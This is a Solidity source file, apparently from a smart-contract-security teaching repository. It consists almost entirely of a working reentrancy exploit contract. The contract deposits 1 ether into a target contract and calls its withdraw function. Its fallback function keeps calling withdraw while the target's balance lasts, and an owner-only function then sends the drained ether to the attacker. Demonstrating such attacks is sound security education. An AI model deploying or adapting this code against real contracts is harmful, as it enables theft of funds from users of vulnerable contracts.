/* This file is part of https://github.com/roirh/smart-contract-security.
 * Copyright (c) 2023 Roi Rodriguez.
 * 
 * This program is free software: you can redistribute it and/or modify  
 * it under the terms of the GNU General Public License as published by  
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but 
 * WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU 
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License 
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
 
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Exploit{
    address payable owner;
    address payable vulnContract;

    constructor(address payable _vulnContract) payable{
        owner = payable(msg.sender);
        vulnContract = _vulnContract;
    }

    modifier onlyowner(){
        require(msg.sender == owner);
        _;
    }

    function addFunds() public payable{

    }


    fallback() external payable{
        if (vulnContract.balance >= 1 ether){
            vulnContract.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
        }
    }
    
    function exploit() onlyowner public{
        exploitDeposit();
        exploitWithdraw();       
    }

    function exploitDeposit() onlyowner public returns(bool){
        (bool ret,) = vulnContract.call{value:1 ether}(abi.encodeWithSignature("deposit()"));
        return ret;
    }

    function exploitWithdraw() onlyowner public returns(bool){
        (bool ret,) = vulnContract.call(abi.encodeWithSignature("withdraw(uint256)",1 ether)); 
        return ret;
    }

    function withdrawAll() onlyowner public payable{
        require(address(this).balance >0);
        require(owner.send(address(this).balance));
    }


}